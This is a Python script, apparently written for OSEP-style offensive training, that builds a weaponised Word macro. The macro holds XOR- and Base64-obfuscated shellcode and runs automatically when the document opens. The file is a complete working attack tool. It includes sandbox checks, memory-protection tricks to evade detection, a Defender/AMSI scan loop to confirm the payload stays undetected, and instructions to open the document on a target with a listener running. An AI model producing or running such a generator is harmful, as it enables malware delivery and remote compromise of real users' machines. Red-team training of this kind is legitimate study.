#!/usr/bin/env python3
"""
OSEP - VBA Shellcode Macro Generator
Embeds XOR+Base64 encrypted shellcode into a ready-to-use Word macro.

Usage:
    python3 generate_macro.py <shellcode.bin> [options]

Options:
    --out  <file>   Output .vba file (default: macro_output.vba)
    --key  <int>    XOR key 0-255 (default: 171 / 0xAB)
    --scan          Run gocheck64 AMSI+Defender scan after generation

Examples:
    # Adaptix agent
    python3 generate_macro.py agent.x64.bin

    # Custom key + auto scan
    python3 generate_macro.py agent.x64.bin --key 0x37 --scan

    # msfvenom raw shellcode
    python3 generate_macro.py shell.bin --out shell_macro.vba --scan
"""

import sys
import os
import base64
import argparse
import subprocess

CHUNK = 900  # safe VBA string literal length per line


def xor(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)


def build_macro(raw: bytes, key: int) -> str:
    encrypted = xor(raw, key)
    b64 = base64.b64encode(encrypted).decode()
    chunks = [b64[i:i + CHUNK] for i in range(0, len(b64), CHUNK)]

    # Build the sc_b64 assignment block
    sc_lines = ['    Dim sc_b64 As String']
    sc_lines.append(f'    sc_b64 = "{chunks[0]}"')
    for ch in chunks[1:]:
        sc_lines.append(f'    sc_b64 = sc_b64 & "{ch}"')
    sc_block = "\n".join(sc_lines)

    return f"""\
' OSEP - VBA Shellcode Macro (auto-generated)
' Shellcode: {len(raw)} bytes | XOR key: 0x{key:02X} | Chunks: {len(chunks)}
' Paste into Word VBA editor: Alt+F11 -> ThisDocument
' Save as .doc | Listener must be running before opening

' ---- Win32 API declarations (must appear before any Sub/Function) ----
Private Declare PtrSafe Function Halloc Lib "kernel32" Alias "VirtualAlloc" _
    (ByVal lpAddr As LongPtr, ByVal dwSize As LongPtr, _
     ByVal flType As Long, ByVal flProt As Long) As LongPtr

Private Declare PtrSafe Sub Hmove Lib "kernel32" Alias "RtlMoveMemory" _
    (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long)

Private Declare PtrSafe Function Hprot Lib "kernel32" Alias "VirtualProtect" _
    (ByVal lpAddr As LongPtr, ByVal dwSize As Long, _
     ByVal flNew As Long, ByRef flOld As Long) As Long

Private Declare PtrSafe Function Hthread Lib "kernel32" Alias "CreateThread" _
    (ByVal lpAttr As LongPtr, ByVal dwStack As LongPtr, _
     ByVal lpStart As LongPtr, ByVal lpParam As LongPtr, _
     ByVal dwFlags As Long, ByRef lpId As Long) As LongPtr

Private Declare PtrSafe Function Hwait Lib "kernel32" Alias "WaitForSingleObject" _
    (ByVal hHandle As LongPtr, ByVal ms As Long) As Long

' ---- Trigger hooks ----
Private Sub Document_Open()
    Gate
End Sub

Private Sub AutoOpen()
    Gate
End Sub

' ---- Sandbox gate + sleep ----
Sub Gate()
    If Len(Environ("USERNAME")) < 2 Then Exit Sub
    If Len(Environ("COMPUTERNAME")) < 2 Then Exit Sub
    ' 5-second sleep via ping (no Application.OnTime dependency)
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run "cmd /c ping 127.0.0.1 -n 6 >nul", 0, True
    RunSC
End Sub

' ---- Shellcode runner ----
Sub RunSC()
    On Error Resume Next
    Const SC_KEY As Integer = {key}

{sc_block}

    ' Base64 decode via MSXML2 (always available on Windows)
    Dim xml  As Object
    Dim node As Object
    Set xml  = CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b")
    node.DataType       = "bin.base64"
    node.nodeTypedValue = sc_b64
    Dim buf() As Byte
    buf = node.nodeTypedValue

    ' XOR decrypt in place
    Dim i As Long
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor SC_KEY
    Next i

    ' Step 1: Allocate RW memory (no execute yet — avoids RWX flag)
    Dim sz   As Long   : sz   = UBound(buf) + 1
    Dim addr As LongPtr: addr = Halloc(0, sz, &H3000, &H4)
    If addr = 0 Then Exit Sub

    ' Step 2: Copy shellcode into RW region
    Hmove addr, buf(0), sz

    ' Step 3: Flip protection RW -> RX (never RWX)
    Dim oldProt As Long
    Hprot addr, sz, &H20, oldProt

    ' Step 4: Execute
    Dim tid As Long
    Dim hTh As LongPtr
    hTh = Hthread(0, 0, addr, 0, 0, tid)
    Hwait hTh, -1
End Sub
"""


def scan(path: str) -> bool:
    gocheck = os.path.join(os.path.dirname(os.path.abspath(__file__)), "gocheck64.exe")
    if not os.path.isfile(gocheck):
        print("[!] gocheck64.exe not found — skipping scan")
        return True
    print(f"[*] Scanning with gocheck64...")
    r = subprocess.run([gocheck, "check", path, "-a", "-d"],
                       capture_output=True, text=True, timeout=60)
    out = r.stdout + r.stderr
    print(out.strip())
    flagged = any(x in out for x in ["Threat detected", "flagged as malicious", "virus"])
    return not flagged


def main():
    p = argparse.ArgumentParser(description="OSEP VBA macro generator")
    p.add_argument("shellcode",          help="Raw shellcode binary (.bin)")
    p.add_argument("--out",  default="macro_output.vba", help="Output .vba file")
    p.add_argument("--key",  default="0xAB",             help="XOR key (default 0xAB)")
    p.add_argument("--scan", action="store_true",        help="Scan output with gocheck64")
    args = p.parse_args()

    if not os.path.isfile(args.shellcode):
        print(f"[!] File not found: {args.shellcode}")
        sys.exit(1)

    key = int(args.key, 0) if args.key.startswith("0x") else int(args.key)
    if not 0 <= key <= 255:
        print("[!] Key must be 0-255")
        sys.exit(1)

    raw = open(args.shellcode, "rb").read()
    print(f"[*] Shellcode   : {args.shellcode} ({len(raw)} bytes)")
    print(f"[*] XOR key     : 0x{key:02X}")

    macro = build_macro(raw, key)
    open(args.out, "w").write(macro)

    b64_len = len(base64.b64encode(raw))
    chunks  = (b64_len + CHUNK - 1) // CHUNK
    print(f"[*] Output      : {args.out}")
    print(f"[*] Macro size  : {len(macro):,} chars | {chunks} SC chunks")

    # Verify round-trip
    enc = bytes(b ^ key for b in raw)
    b64 = base64.b64encode(enc).decode()
    dec = bytes(b ^ key for b in base64.b64decode(b64))
    print(f"[*] Round-trip  : {'OK' if dec == raw else 'FAIL'}")

    if args.scan:
        ok = scan(args.out)
        print(f"[{'PASS' if ok else 'FAIL'}] gocheck64 scan")
    else:
        print(f"[*] Tip: add --scan to auto-run gocheck64")

    print(f"\n[+] Done. Paste {args.out} into Word VBA editor (ThisDocument).")
    print(f"    Save as .doc and open on target with listener running.")


if __name__ == "__main__":
    main()
